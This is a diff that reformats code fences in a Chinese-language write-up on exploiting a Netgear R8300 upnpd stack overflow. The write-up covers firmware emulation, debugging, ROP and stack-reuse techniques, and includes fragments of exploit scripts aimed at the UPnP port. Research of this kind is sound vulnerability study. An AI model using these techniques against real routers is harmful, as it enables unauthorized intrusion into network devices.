@@ -56,7 +56,7 @@ https://www.anquanke.com/post/id/217606
 首先下载有问题的固件 R8300 Firmware Version 1.0.2.130 http://www.downloads.netgear.com/files/GDC/R8300/R8300-V1.0.2.130_1.0.99.zip
 使用binwalk对固件中的特征字符串进行识别，可以看到R8300采用了squashfs文件系统格式
 
-```
+```shell
 $ binwalk R8300-V1.0.2.130_1.0.99.chk
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
@@ -69,7 +69,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 使用 `binwalk -Me` 提取出 Squashfs 文件系统，可以看到R8300为ARM v5架构.
 
-```
+```shell
 $ file usr/sbin/upnpd
 usr/sbin/upnpd: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (SYSV), dynamically linked (uses shared libs), stripped
 ```
@@ -84,7 +84,7 @@ usr/sbin/upnpd: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (SYSV), dynamic
 
 * NVRAM库劫持失败，firmadyne实现了sem_get()、sem_lock()、sem_unlock()等函数https://github.com/firmadyne/libnvram
 
-```
+```shell
 $ ./fat.py 'Path to R8300 firmware file'
 
                                __           _
@@ -374,7 +374,7 @@ sem_lock: Unable to get semaphore!
 使用Qemu模拟固件需要下载对应的arm虚拟机镜像，内核和initrd。
 https://people.debian.org/~aurel32/qemu/armhf/
 
-```
+```shell
 [debian_wheezy_armhf_desktop.qcow2](https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_desktop.qcow2)  2013-12-17 02:43  1.7G   [debian_wheezy_armhf_standard.qcow2](https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2) 2013-12-17 00:04  229M   
 [initrd.img-3.2.0-4-vexpress](https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress)        2013-12-17 01:57  2.2M   
 [vmlinuz-3.2.0-4-vexpress](https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress)           2013-09-20 18:33  1.9M  
@@ -389,8 +389,8 @@ https://people.debian.org/~aurel32/qemu/armhf/
 
 对于R8300固件，在 Host 机上创建一个 tap 接口并分配 IP，启动虚拟机：
 
-```
-`sudo tunctl -t tap0 -u `whoami`
+```shell
+sudo tunctl -t tap0 -u `whoami`
 sudo ifconfig tap0 192.168.2.1/24
 qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic`
 ```
@@ -398,16 +398,16 @@ qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.i
 与标准命令区别在于` -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic`
 启动之后输入用户名和密码，都是 root，为虚拟机分配 IP：
 
-```
-`root@debian-armhf:~# ifconfig eth0 ``192.168``.``2.2``/``24`
+```shell
+root@debian-armhf:~# ifconfig eth0 192.168.2.2/24
 ```
 
 这样 Host 和虚拟机就网络互通了，然后挂载 proc、dev，最后 chroot 即可。
 
 ```
-`root@debian-armhf:~# mount -t proc /proc ./squashfs-root/proc
+root@debian-armhf:~# mount -t proc /proc ./squashfs-root/proc
 root@debian-armhf:~# mount -o bind /dev ./squashfs-root/dev
-root@debian-armhf:~# chroot ./squashfs-root/ sh`
+root@debian-armhf:~# chroot ./squashfs-root/ sh
 ```
 
 
@@ -429,26 +429,26 @@ $ arm-linux-gcc -Wall -fPIC -shared nvram.c  -o nvram.so
 nvram库的实现者还同时 hook 了 `system`、`fopen`、`open` 等函数，因此还会用到 `dlsym`，`/lib/libdl.so.0 `导出了该符号。
 
 ```
-`$ grep ``-``r ``"dlsym"`` ``.`
-`Binary`` file ``./``lib``/``libcrypto``.``so``.``1.0``.``0`` matches`
-`Binary`` file ``./``lib``/``libdl``.``so``.``0`` matches`
-`Binary`` file ``./``lib``/``libhcrypto``-``samba4``.``so``.``5`` matches`
-`Binary`` file ``./``lib``/``libkrb5``-``samba4``.``so``.``26`` matches`
-`Binary`` file ``./``lib``/``libldb``.``so``.``1`` matches`
-`Binary`` file ``./``lib``/``libsamba``-``modules``-``samba4``.``so matches`
-`Binary`` file ``./``lib``/``libsqlite3``.``so``.``0`` matches`
-`grep``:`` ``./``lib``/``modules``/``2.6``.``36.4brcmarm``+:`` ``No`` such file ``or`` directory`
+$ grep -r "dlsym" .
+Binary file ./lib/libcrypto.so.1.0.0 matches
+Binary file ./lib/libdl.so.0 matches
+Binary file ./lib/libhcrypto-samba4.so.5 matches
+Binary file ./lib/libkrb5-samba4.so.26 matches
+Binary file ./lib/libldb.so.1 matches
+Binary file ./lib/libsamba-modules-samba4.so matches
+Binary file ./lib/libsqlite3.so.0 matches
+grep: ./lib/modules/2.6.36.4brcmarm+: No such file or directory
 
-$ `readelf ``-``a `**`./``lib``/``libdl``.``so``.`**`**0**`` ``|`` grep dlsym`
-`    ``26``:`` ``000010f0``   ``296`` FUNC    GLOBAL DEFAULT    ``7`` dlsym`
+$ readelf -a *./lib/libdl.so.**0* | grep dlsym
+    26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym
 ```
 
 * 配置tmp/nvram.ini信息
 
 接下来要做的就是根据上面的日志补全配置信息，也可以参考https://github.com/zcutlip/nvram-faker/blob/master/nvram.ini。至于为什么这么设置，可以查看对应的汇编代码逻辑（配置的有问题的话很容易触发段错误）。
 
-```
-`upnpd_debug_level=9
+```shell
+upnpd_debug_level=9
 lan_ipaddr=192.168.2.2
 hwver=R8500
 friendly_name=R8300
@@ -461,13 +461,13 @@ upnp_duration=3600
 upnp_DHCPServerConfigurable=1
 wps_is_upnp=0
 upnp_sa_uuid=00000000000000000000
-lan_hwaddr=AA:BB:CC:DD:EE:FF`
+lan_hwaddr=AA:BB:CC:DD:EE:FF
 ```
 
 * 运行过程
 
-```
-**# ./usr/sbin/upnpd**
+```shell
+# ./usr/sbin/upnpd
 # /dev/nvram: No such file or directory
 /dev/nvram: No such file or directory
 /dev/nvram: No such file or directory
@@ -480,13 +480,13 @@ lan_hwaddr=AA:BB:CC:DD:EE:FF`
 /dev/nvram: No such file or directory
 /dev/nvram: No such file or directory
 
-**# LD_PRELOAD="./nvram.so" ./usr/sbin/upnpd**
+# LD_PRELOAD="./nvram.so" ./usr/sbin/upnpd
 # ./usr/sbin/upnpd: can't resolve symbol 'dlsym'
 
-**# LD_PRELOAD="./nvram.so ./lib/libdl.so.0" ./usr/sbin/upnpd**
+# LD_PRELOAD="./nvram.so ./lib/libdl.so.0" ./usr/sbin/upnpd
 # [0x00026460] fopen('/var/run/upnpd.pid', 'wb+') = 0x00b19008
 [0x0002648c] custom_nvram initialised
-[0x76eb7cb8] **fopen****('/tmp/nvram.ini', 'r') = 0x00b19008**
+[0x76eb7cb8] *fopen**('/tmp/nvram.ini', 'r') = 0x00b19008*
 [nvram 0] upnpd_debug_level = 9
 [nvram 1] lan_ipaddr = 192.168.2.2
 [nvram 2] hwver = R8500
@@ -523,21 +523,21 @@ acosNvramConfig_get('upnpd_debug_level') = '9'
 在 `sub_25E04()` 中调用 `strcpy()` 将以上数据拷贝到大小为 `0x634 - 0x58 = 0x5dc` 的 buffer。如果超过缓冲区大小，数据就会覆盖栈底部分甚至返回地址。
 ![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083972/netgear/image_30.png)
 
-```
-`                 ``+-----------------+`
-`                  ``|``     retaddr     ``|`
-`                  ``+-----------------+`
-`                 ``|``     saved ebp   ``|`
-`          ebp``--->+-----------------+`
-`                 ``|``                 ``|`
-`                 ``|``                 ``|
-                 |                 |
-    s,ebp-0x58-->+-----------------+`
-`                 ``|``                 ``|`
-`                 ``|``     buffer      ``|`
-`                 ``|``                 ``|`
-`                 ``|``                 ``|`
-` v40``,``ebp``-``0x634``-->+-----------------+`
+```shell
+                +-----------------+
+                |     retaddr     |
+                +-----------------+
+                |     saved ebp   |
+         ebp--->+-----------------+
+                |                 |
+                |                 |
+                |                 |
+   s,ebp-0x58-->+-----------------+
+                |                 |
+                |     buffer      |
+                |                 |
+                |                 |
+v40,ebp-0x634-->+-----------------+
 ```
 
 
@@ -562,17 +562,17 @@ Listening on port 12345
 `gdb-multiarch -x dbgscript`
 dbgscript 内容
 
-```
-`set`` architecture arm`
-`gef``-``remote ``-``q ``192.168``.2``.1``:``12345`
-`file usr``/``sbin``/``upnpd`
-`set`` remote ``exec``-``file ``/``usr``/``sbin``/upnpd`
+```shell
+set architecture arm
+gef-remote -q 192.168.2.1:12345
+file usr/sbin/upnpd
+set remote exec-file /usr/sbin/upnpd
 ```
 
 直接构造溢出字符，程序不会正常返回，因为栈上存在一个v40的指针v51，需要覆盖为有效地址才能正确返回。
 ![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083781/netgear/image_23.png)
 
-```
+```python
 #!/usr/bin/python3
 
 import socket
@@ -593,7 +593,7 @@ s.close()
 
 
 ![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_24.png)
-```
+```python
 #!/usr/bin/python3
 
 import socket
@@ -626,7 +626,7 @@ s.close()
 ![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083780/netgear/image_25.png)
 在堆栈恢复前下一个断点，观察控制流转移情况，将PC指针控制为重启指令。通过 hook 的日志可以看到，ROP 利用链按照预期工作（由于模拟环境的问题，reboot 命令运行段错误了...）
 
-```
+```shell
 gef➤ b *0x00025F40
 Breakpoint 1 at 0x25f40
 
@@ -669,7 +669,7 @@ rmmod: dhd.ko: No such file or directory
 路由器已启用ASLR缓解功能，我们可以使用ROP攻击绕过该功能。但是，我们通过使用对NULL字节敏感的**strcpy**来执行复制调用，这反过来又会阻止我们使用ROP攻击。因此，要利用包含NULL字节的地址，我们将需要使用堆栈重用攻击。即想办法提前将 ROP payload 注入目标内存。（`stack reuse`）
 注意到recvfrom函数在接收 socket 数据时 buffer 未初始化，利用内存未初始化问题，我们可以向sub_1D020的堆栈中布置gadgets。构造如下 PoC，每个 payload 前添加 `\x00` 防止程序崩溃（strcpy遇到\x00截断，不会拷贝后面部分）。
 
-```
+```python
 #!/usr/bin/python3
 
 import socket
@@ -684,7 +684,7 @@ s.close()
 
 在strcpy下断点调试，并检查栈区内存
 
-```
+```shell
 gef➤  info b
 Num     Type           Disp Enb Address    What
 1       breakpoint     keep y   0x76dd6e48 <recvfrom+4>
@@ -711,7 +711,7 @@ gef➤  x/s 0x7eb6cc75+1588
 
 此时程序上下文为
 
-```
+```shell
 gef➤  context
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────────────────────────────────── registers ────
@@ -774,7 +774,7 @@ $cpsr: [NEGATIVE zero carry overflow interrupt fast thumb]
 |真实利用：	|IP:192.168.2.2 Port:upnp/1900	|
 ||![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083779/netgear/image_27.png)	|
 
-```
+```python
 import socket
 import time
 import sys
